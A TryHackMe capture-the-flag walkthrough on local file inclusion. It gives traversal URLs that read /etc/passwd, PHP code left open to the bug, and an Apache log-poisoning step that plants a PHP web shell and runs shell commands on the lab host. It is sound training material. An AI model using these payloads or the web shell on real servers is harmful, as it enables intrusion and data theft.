# LFI basics

[LFI basics](https://tryhackme.com/room/lfibasics) is a TryHackMe CTF focussed on Local File Inclusion vulnerabilities.

##  [Task 1] Local File Inclusion 

### 1.

Browse the given hostname. In my case it's `10.10.129.193`.

### 2.

Add the parameter `?page=` to _LFI 1_.

`http://10.10.129.193/lfi/lfi.php?page=`


We cycling through, we see the page returns the GET request parameter on page.

```
http://10.10.129.193/lfi/lfi.php?page=2
```
Returns 
```
File included: 2
Local file to be used: 2
```

### 3.

We can include the hompage with the following:
```
http://10.10.129.193/lfi/lfi.php?page=home.html
```

### 4.

The message we get after including `home.html` is visible in bold on screen after completing [#3](#3).

### 5. 

We can then attempt to LFI system files like `/etc/passwd` with:

```url
http://10.10.129.193/lfi/lfi.php?page=../../../../etc/passwd
```

Which returns the following text on page.

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false messagebus:x:106:110::/var/run/dbus:/bin/false uuidd:x:107:111::/run/uuidd:/bin/false lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false whoopsie:x:109:117::/nonexistent:/bin/false avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false saned:x:119:127::/var/lib/saned:/bin/false usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false lfi:x:1000:1000:THM,,,:/home/lfi:/bin/bash 
```

### 6. 

We can than browse throguh to find user's that aren't there by default. A hint towards no default users are uses that have `/home/` directories.

### 7. 

An example of LFI vulnerable PHP is:

```php
<?php 
    $file = $_REQUEST["page"];
?>
```

## [Task 2] Local File Inclusion using Directory Traversal 

### 1.

Move to the second walkthrough page.
```
http://10.10.129.193/lfi2/lfi.php
```

### 2.

We can see that adding `home.html` file through the `?page=` parameter does not return the same file as previously.

### 3.

So we need to exploit `../` to traverse upwards in domains. For example, if we use `http://10.10.129.193/lfi2/lfi.php?page=../creditcard` we pull some "credit-card" information.

### 4.
The above included file is visible on screen after navigating to the page.

### 5.
We can use the same concept to traverse upwards and pull the the `/etc/passwd` file (as we did in the previous task).

```
http://10.10.129.193/lfi2/lfi.php?page=../../../../../etc/passwd
```

### 6. 
This task used vulnerable code like:
```php
$local = "html/".$_REQUEST["page"];
```

## [Task 3] Reaching RCE using LFI and log poisoning

### 1.

In the task we'll use remote code execution and log poisoning, alongside LFI.

### 2. 

To do this, we need to inject some malicious code into the server's logs. This, however, will require read/write permissions in the server's directory.

### 3.

On browsing to _LFI 3_, we can try LFI `/var/log/apache2/access.log`.

```
http://10.10.129.193/lfi/lfi.php?page=../../../log/apache2/access.log
```

And we get 

```apache
10.11.8.219 - - [20/Sep/2020:03:42:51 -0700] "GET / HTTP/1.1" 200 588 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 10.11.8.219 - - [20/Sep/2020:03:42:51 -0700] "GET /favicon.ico HTTP/1.1" 404 491 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 10.11.8.219 - - [20/Sep/2020:03:42:53 -0700] "GET /lfi/lfi.php HTTP/1.1" 200 263 "http://10.10.129.193/" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 10.11.8.219 - - [20/Sep/2020:03:43:52 -0700] "GET /lfi/lfi.php?page= HTTP/1.1" 200 264 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 10.11.8.219 - - [20/Sep/2020:03:43:55 -0700] "GET /lfi/lfi.php?page=1 HTTP/1.1" 200 265 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 10.11.8.219 - - [20/Sep/2020:03:43:57 -0700] "GET /lfi/lfi.php?page=2 HTTP/1.1" 200 265 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 10.11.8.219 - - [20/Sep/2020:03:45:28 -0700] "GET /lfi/lfi.php?page= HTTP/1.1" 200 264 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 10.11.8.219 - - [20/Sep/2020:03:45:35 -0700] "GET /lfi/lfi.php?page=home.html HTTP/1.1" 200 337 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 10.11.8.219 - - [20/Sep/2020:03:47:24 -0700] "GET /lfi/lfi.php?page=../../../etc/passwd HTTP/1.1" 200 327 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 10.11.8.219 - - [20/Sep/2020:03:47:28 -0700] "GET /lfi/lfi.php?page=../../../../etc/passwd HTTP/1.1" 200 1153 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 10.11.8.219 - - [20/Sep/2020:03:52:23 -0700] "GET /lfi2/lfi.php HTTP/1.1" 200 269 "http://10.10.129.193/" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 10.11.8.219 - - [20/Sep/2020:03:52:55 -0700] "GET /lfi2/lfi.php?page=1 HTTP/1.1" 200 271 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 10.11.8.219 - - [20/Sep/2020:03:53:08 -0700] "GET /lfi2/lfi.php?page=home.html HTTP/1.1" 200 335 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 10.11.8.219 - - [20/Sep/2020:03:54:18 -0700] "GET /lfi2/lfi.php?page=../creditcard HTTP/1.1" 200 346 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 10.11.8.219 - - [20/Sep/2020:03:56:08 -0700] "GET /lfi2/lfi.php?page=../../etc/passwd HTTP/1.1" 200 334 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 10.11.8.219 - - [20/Sep/2020:03:56:12 -0700] "GET /lfi2/lfi.php?page=../../../etc/passwd HTTP/1.1" 200 333 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 10.11.8.219 - - [20/Sep/2020:03:56:15 -0700] "GET /lfi2/lfi.php?page=../../../,,.etc/passwd HTTP/1.1" 200 336 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 10.11.8.219 - - [20/Sep/2020:03:56:20 -0700] "GET /lfi2/lfi.php?page=../../../../etc/passwd HTTP/1.1" 200 333 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 10.11.8.219 - - [20/Sep/2020:03:56:23 -0700] "GET /lfi2/lfi.php?page=../../../../../etc/passwd HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 10.11.8.219 - - [20/Sep/2020:03:59:27 -0700] "GET /lfi/lfi.php HTTP/1.1" 200 264 "http://10.10.129.193/" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 10.11.8.219 - - [20/Sep/2020:03:59:31 -0700] "GET /lfi/lfi.php HTTP/1.1" 200 263 "http://10.10.129.193/" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 10.11.8.219 - - [20/Sep/2020:04:00:30 -0700] "GET /lfi/lfi.php?page=../../../log/apach2/access.log HTTP/1.1" 200 337 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 
```

### 4. 
The above is clearly readable; although, not that pretty. This means we(the web-application) has read permissions in this directory.

### 5. 
Now, we'll poison the log. We can inject some malicious PHP code into our `User Agent` section of our server request. It will be executed when the file is _included_ as it will be run by the PHP server.

THM says to use BurpSuite, i'm just going to capture the packet in the Console > Network tab on Firefox. Right click the request, then Edit & Resend. 

Our request should look like this
```
Host: 10.10.129.193 <?php system($_GET['lfi']);?>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

On send, we won't actually see any changes on the page, because the PHP will be compiled. 

But, we've basically made a GET parameter that will pass our requests to system via the following parameter.

And you'll notice that on executing code on the parameter `?page=...&lfi=...` that we can execute shell commands

```
http://10.10.129.193/lfi/lfi.php?page=../../../log/apache2/access.log&lfi=ls -la
```
The above returns our command at the bottom of the page:
```apache
....
....
drwxr-xr-x 2 www-data www-data 4096 Dec 23 2019 . 
drwxr-xr-x 4 root root 4096 Dec 23 2019 .. 
-rw-r--r-- 1 www-data www-data 161 May 25 2014 .htaccess -rw-r--r-- 1 www-data www-data 39 May 25 2014 contact.html -rw-r--r-- 1 www-data www-data 20 May 25 2014 creditcard -rw-r--r-- 1 www-data www-data 63 Dec 16 2019 home.html -rw-r--r-- 1 www-data www-data
....
....
```

### 6.

Next we can try running `uname -r`.

And we can view the system type: `4.15.0-72-generic`.

### 7. 

Now we can read the flag from the `lfi` user's directory. Note, we'll use our shell execution instead of direct LFI.

First running:
```
Desktop Documents Downloads Music Pictures Public Templates Videos flag.txt
```

And secondly reading from the flag.txt file while:
```
THM{[flag here]]}
```
### 8.

And that's it. From here was an check out more advanced [LFI information](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).
